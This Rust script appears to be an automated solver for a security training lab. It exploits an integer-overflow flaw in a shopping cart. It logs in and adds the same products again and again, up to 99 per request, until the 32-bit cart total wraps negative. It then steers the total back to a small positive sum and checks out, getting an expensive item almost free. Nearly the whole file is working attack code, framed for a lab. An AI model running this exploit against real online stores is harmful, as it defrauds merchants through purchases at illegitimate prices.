#!/usr/bin/env rust-script
//! name: cart_int_overflow
//! description: 购物车 32 位整数回绕(buy-at-overflow)驱动器 - 服务端把每次加购的 quantity 限制在 <=99,所以靠同一商品反复累加把购物车总价推过 2^31 分回绕成负数;回绕后按「最大不越过零」贪心逐级逼近(从商品表按价格降序取 min(99, |total|/price) 的最大步),末步在 total 落在 (-最便宜单价, 0] 时补一件最便宜商品,使总价成为小额正数,再结账;一个信封给出请求数、回绕点、总价轨迹样本、最终总价与订单确认
//! version: 1.0.1
//! args: <base-url> [--user user] [--password peter] [--jacket 1] [--per-request 99] [--credit-cents N] [--max-requests N] [--snippet N] [--selftest]
//! keywords: logic-flaw, integer-overflow, cart, ecommerce, shop, low-level
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::collections::BTreeMap;
use std::time::Duration;

const MOD: i64 = 1i64 << 32;
const HALF: i64 = 1i64 << 31;

/// Signed 32-bit wrap: what a Java int cart total does when the sum exceeds 2^31-1.
fn wrap(x: i64) -> i64 {
    let r = x.rem_euclid(MOD);
    if r >= HALF {
        r - MOD
    } else {
        r
    }
}

/// Next add: (product_id, price_cents, quantity). candidates are sorted by price descending.
/// Positive total keeps climbing toward the wrap with the biggest step; a negative total takes
/// the largest step that does not cross zero; when no step fits, one unit of the cheapest product.
fn step(t: i64, cands: &[(u32, i64)], per: i64) -> (u32, i64, i64) {
    if t >= 0 {
        let (id, price) = cands[0];
        return (id, price, per);
    }
    let mut best: Option<(u32, i64, i64)> = None;
    let mut best_step = 0i64;
    for &(id, price) in cands {
        let q = ((-t) / price).min(per);
        if q >= 1 {
            let s = q * price;
            if best.is_none() || s > best_step {
                best = Some((id, price, q));
                best_step = s;
            }
        }
    }
    match best {
        Some(b) => b,
        None => {
            let (id, price) = cands[cands.len() - 1];
            (id, price, 1)
        }
    }
}

struct Client {
    agent: ureq::Agent,
    base: String,
    jar: BTreeMap<String, String>,
}

impl Client {
    fn new(base: String) -> Self {
        Client {
            agent: ureq::AgentBuilder::new().timeout(Duration::from_secs(20)).redirects(0).build(),
            base,
            jar: BTreeMap::new(),
        }
    }

    fn send(&mut self, method: &str, path: &str, form: Option<Vec<(&str, String)>>) -> Result<(u16, String, String), String> {
        let url = format!("{}{}", self.base, path);
        let body = form.map(|f| f.iter().map(|(k, v)| format!("{}={}", enc(k), enc(v))).collect::<Vec<_>>().join("&"));
        let mut last_err = String::new();
        for attempt in 0..4 {
            if attempt > 0 {
                std::thread::sleep(Duration::from_millis(300));
            }
            let cookie = self.jar.iter().map(|(k, v)| format!("{k}={v}")).collect::<Vec<_>>().join("; ");
            let mut req = self.agent.request(method, &url);
            if !cookie.is_empty() {
                req = req.set("Cookie", &cookie);
            }
            let result = match &body {
                Some(b) => req.set("Content-Type", "application/x-www-form-urlencoded").send_string(b),
                None => req.call(),
            };
            match result {
                Ok(r) => return Ok(self.finish(r)),
                Err(ureq::Error::Status(_, r)) => return Ok(self.finish(r)),
                Err(e) => last_err = format!("{e}"),
            }
        }
        Err(format!("{method} {path}: {last_err}"))
    }

    fn finish(&mut self, r: ureq::Response) -> (u16, String, String) {
        let status = r.status();
        let location = r.header("Location").unwrap_or("").to_string();
        for c in r.all("Set-Cookie") {
            if let Some((kv, _)) = c.split_once(';') {
                if let Some((k, v)) = kv.split_once('=') {
                    self.jar.insert(k.trim().to_string(), v.trim().to_string());
                }
            }
        }
        (status, location, r.into_string().unwrap_or_default())
    }
}

fn enc(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
            b' ' => out.push('+'),
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

fn csrf(html: &str) -> Option<String> {
    let needle = "name=\"csrf\" value=\"";
    let i = html.find(needle)? + needle.len();
    let rest = &html[i..];
    let j = rest.find('"')?;
    Some(rest[..j].to_string())
}

/// Dollars after a needle, sign-aware ("$-16209672.96" parses).
fn money_after(html: &str, needle: &str) -> Option<f64> {
    let i = html.find(needle)? + needle.len();
    let rest = &html[i..];
    let end = rest.find(|c: char| !(c.is_ascii_digit() || c == '.' || c == ',' || c == '-')).unwrap_or(rest.len());
    rest[..end].replace(',', "").parse().ok()
}

fn cart_total_cents(html: &str) -> Option<i64> {
    let i = html.find("<th>Total:</th>")? + "<th>Total:</th>".len();
    let seg = &html[i..(i + 120).min(html.len())];
    let bytes = seg.as_bytes();
    let d = seg.find(|c: char| c.is_ascii_digit())?;
    let mut start = d;
    while start > 0 && matches!(bytes[start - 1], b'$' | b'-' | b' ') {
        start -= 1;
    }
    let mut end = d;
    while end < seg.len() && matches!(bytes[end], b'0'..=b'9' | b'.' | b',') {
        end += 1;
    }
    let raw = seg[start..end].replace('$', "").replace(',', "");
    let v: f64 = raw.parse().ok()?;
    Some((v * 100.0).round() as i64)
}

/// The raw totals row, for evidence when a parse fails.
fn total_row(html: &str) -> String {
    match html.find("<th>Total:</th>") {
        Some(i) => {
            let seg = &html[i..(i + 80).min(html.len())];
            clip(&seg.replace('<', " <"), 80)
        }
        None => String::new(),
    }
}

fn credit_cents(html: &str) -> Option<i64> {
    Some((money_after(html, "Store credit: $")? * 100.0).round() as i64)
}

/// Home-page tiles: "/product?productId=N" with the unit price just before the link.
fn product_prices(html: &str) -> Vec<(u32, i64)> {
    let mut out: Vec<(u32, i64)> = Vec::new();
    let mut from = 0usize;
    while let Some(rel) = html[from..].find("href=\"/product?productId=") {
        let at = from + rel;
        let idstart = at + "href=\"/product?productId=".len();
        let idend = html[idstart..].find('"').map(|x| idstart + x).unwrap_or(idstart);
        let id: u32 = match html[idstart..idend].parse() {
            Ok(v) => v,
            Err(_) => {
                from = idend;
                continue;
            }
        };
        let head = &html[at.saturating_sub(400)..at];
        if let Some(dollar) = head.rfind('$') {
            if let Some(price) = money_after(&head[dollar..], "$") {
                out.push((id, (price * 100.0).round() as i64));
            }
        }
        from = idend;
    }
    out.sort_by(|a, b| a.0.cmp(&b.0));
    out.dedup_by_key(|p| p.0);
    out
}

fn solved(html: &str) -> bool {
    html.contains("widgetcontainer-lab-status is-solved") || html.contains("Congratulations")
}

fn clip(s: &str, n: usize) -> String {
    let flat: String = s.split_whitespace().collect::<Vec<_>>().join(" ");
    flat.chars().take(n).collect()
}

fn selftest() -> ! {
    let cands = vec![(1u32, 133700i64), (10, 516)];
    // start as if one jacket had just been added: the cart total is then above the target
    let mut t = 133700i64;
    let mut reqs = 0u32;
    let mut wrap_at = 0u32;
    let mut seen_pos = false;
    while reqs < 4000 {
        if t >= 0 && t <= 10000 {
            break;
        }
        let (_, price, q) = step(t, &cands, 99);
        let before = t;
        t = wrap(t + price * q);
        reqs += 1;
        if before >= 0 && t < 0 {
            seen_pos = true;
            wrap_at = reqs;
        }
    }
    let ok = seen_pos && t > 0 && t <= 10000;
    let payload = json!({
        "selftest": true,
        "wrap_at_request": wrap_at,
        "requests": reqs,
        "final_cents": t,
        "ok": ok,
    });
    pi_rust_lib::report::success("cart_int_overflow", payload, "selftest ok; run against the lab").unwrap_or(());
    std::process::exit(if ok { 0 } else { 1 });
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
    }
    let mut base = String::new();
    let mut user = "user".to_string();
    let mut pass = "peter".to_string();
    let mut jacket: u32 = 1;
    let mut per: i64 = 99;
    let mut credit_cap: i64 = -1;
    let mut max_requests: u32 = 1200;
    let mut snippet = 200usize;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--user" => { i += 1; user = args[i].clone(); }
            "--password" => { i += 1; pass = args[i].clone(); }
            "--jacket" => { i += 1; jacket = args[i].parse().unwrap_or(jacket); }
            "--per-request" => { i += 1; per = args[i].parse().unwrap_or(per); }
            "--credit-cents" => { i += 1; credit_cap = args[i].parse().unwrap_or(credit_cap); }
            "--max-requests" => { i += 1; max_requests = args[i].parse().unwrap_or(max_requests); }
            "--snippet" => { i += 1; snippet = args[i].parse().unwrap_or(snippet); }
            other if base.is_empty() && other.starts_with("http") => base = other.trim_end_matches('/').to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        pi_rust_lib::report::failure("cart_int_overflow", "usage: cart_int_overflow <base-url> [--user U --password P --jacket N --per-request 99 --credit-cents N]", "pass the lab instance URL; the piece logs in itself");
        std::process::exit(2);
    }

    match run(base, user, pass, jacket, per, credit_cap, max_requests, snippet) {
        Ok(payload) => pi_rust_lib::report::success("cart_int_overflow", payload, "check solved and checkout.order_confirmed").unwrap_or(()),
        Err(e) => {
            pi_rust_lib::report::failure("cart_int_overflow", &e, "check the instance state and rerun; the cart keeps its accumulated quantity between runs");
            std::process::exit(1);
        }
    }
}

#[allow(clippy::too_many_arguments)]
fn run(base: String, user: String, pass: String, jacket_id: u32, per: i64, credit_cap: i64, max_requests: u32, snippet: usize) -> Result<Value, String> {
    let mut c = Client::new(base.clone());

    let (_, _, login_page) = c.send("GET", "/login", None)?;
    let tok = csrf(&login_page).ok_or("no csrf on /login")?;
    let (status, location, _) = c.send("POST", "/login", Some(vec![("csrf", tok), ("username", user.clone()), ("password", pass.clone())]))?;
    if status != 302 {
        return Err(format!("login failed with status {status}"));
    }
    let account_path = if location.is_empty() { format!("/my-account?id={user}") } else { location };
    let (_, _, account) = c.send("GET", &account_path, None)?;
    let credit = credit_cents(&account).ok_or("no store credit on the account page")?;
    let target = if credit_cap > 0 { credit_cap.min(credit) } else { credit };

    let (_, _, home) = c.send("GET", "/", None)?;
    let mut prods = product_prices(&home);
    if prods.is_empty() {
        return Err("could not parse the product table on /".to_string());
    }
    let jacket_price = prods.iter().find(|p| p.0 == jacket_id).map(|p| p.1).ok_or(format!("product {jacket_id} not in the product table"))?;
    prods.sort_by(|a, b| b.1.cmp(&a.1));
    let cheapest = *prods.last().ok_or("no products")?;
    if cheapest.1 > target {
        return Err(format!("cheapest unit {} cents exceeds the {} cents target", cheapest.1, target));
    }
    let cands: Vec<(u32, i64)> = prods.clone();

    let (_, _, cart) = c.send("GET", "/cart", None)?;
    // an empty cart has no totals table at all
    let mut t = match cart_total_cents(&cart) {
        Some(v) => v,
        None if cart.contains("Your cart is empty") => 0,
        None => return Err("no cart total on /cart".to_string()),
    };
    let start = t;
    let mut added_jacket = false;
    if !cart.contains(&format!("productId={jacket_id}")) {
        // ensure the jacket is in the cart before the climb
        let (status, _, _) = c.send("POST", "/cart", Some(vec![("productId", jacket_id.to_string()), ("redir", "CART".to_string()), ("quantity", "1".to_string())]))?;
        if status != 302 {
            return Err(format!("adding the jacket failed with status {status}"));
        }
        t = wrap(t + jacket_price);
        added_jacket = true;
    }

    let mut reqs = 0u32;
    let mut wrap_at: Option<u32> = None;
    let mut traj: Vec<Value> = Vec::new();
    let mut mismatch: Option<Value> = None;

    while reqs < max_requests {
        if t >= 0 && t <= target {
            break;
        }
        let (pid, price, q) = step(t, &cands, per);
        let (status, _, body) = c.send("POST", "/cart", Some(vec![("productId", pid.to_string()), ("redir", "CART".to_string()), ("quantity", q.to_string())]))?;
        if status != 302 {
            return Err(format!("add productId={pid}&quantity={q} rejected with status {status}: {}", clip(&body, snippet)));
        }
        let before = t;
        t = wrap(t + price * q);
        reqs += 1;
        if before >= 0 && t < 0 && wrap_at.is_none() {
            wrap_at = Some(reqs);
            let (_, _, cart) = c.send("GET", "/cart", None)?;
            let obs = cart_total_cents(&cart).unwrap_or(i64::MIN);
            traj.push(json!({"at_request": reqs, "kind": "wrap", "predicted_cents": t, "observed_cents": obs, "row": total_row(&cart)}));
            if obs != t {
                mismatch = Some(json!({"at_request": reqs, "predicted_cents": t, "observed_cents": obs}));
                break;
            }
        } else if reqs % 60 == 0 {
            let (_, _, cart) = c.send("GET", "/cart", None)?;
            let obs = cart_total_cents(&cart).unwrap_or(i64::MIN);
            traj.push(json!({"at_request": reqs, "kind": "checkpoint", "predicted_cents": t, "observed_cents": obs, "row": total_row(&cart)}));
            if obs != t {
                mismatch = Some(json!({"at_request": reqs, "predicted_cents": t, "observed_cents": obs}));
                break;
            }
        }
    }

    let mut checkout = Value::Null;
    let mut final_total = t;
    if mismatch.is_none() && t >= 0 && t <= target {
        let (_, _, cart) = c.send("GET", "/cart", None)?;
        final_total = cart_total_cents(&cart).unwrap_or(t);
        let tok = csrf(&cart).ok_or("no csrf on /cart before checkout")?;
        let (status, location, body) = c.send("POST", "/cart/checkout", Some(vec![("csrf", tok)]))?;
        let follow = if location.is_empty() { "/cart/order-confirmation?order-confirmed=true".to_string() } else { location.clone() };
        let (_, _, confirm) = c.send("GET", &follow, None)?;
        checkout = json!({
            "status": status,
            "location": location,
            "body": clip(&body, snippet),
            "confirmation_url": follow,
            "order_confirmed": confirm.contains("Order confirmed") || confirm.contains("order-confirmed"),
            "confirmation_snippet": clip(&confirm.replace('<', " <"), snippet),
        });
    }

    let (_, _, root) = c.send("GET", "/", None)?;
    let payload = json!({
        "base": base,
        "user": user,
        "store_credit_cents": credit,
        "target_cents": target,
        "jacket_product": jacket_id,
        "jacket_price_cents": jacket_price,
        "cheapest_product": cheapest.0,
        "cheapest_price_cents": cheapest.1,
        "per_request": per,
        "cart_start_cents": start,
        "jacket_added_by_driver": added_jacket,
        "requests": reqs,
        "wrap_at_request": wrap_at,
        "trajectory": traj,
        "mismatch": mismatch,
        "final_total_cents": final_total,
        "final_total_dollars": final_total as f64 / 100.0,
        "checkout": checkout,
        "solved": solved(&root),
        "root_snippet": clip(&root.replace('<', " <"), 240),
    });
    Ok(payload)
}
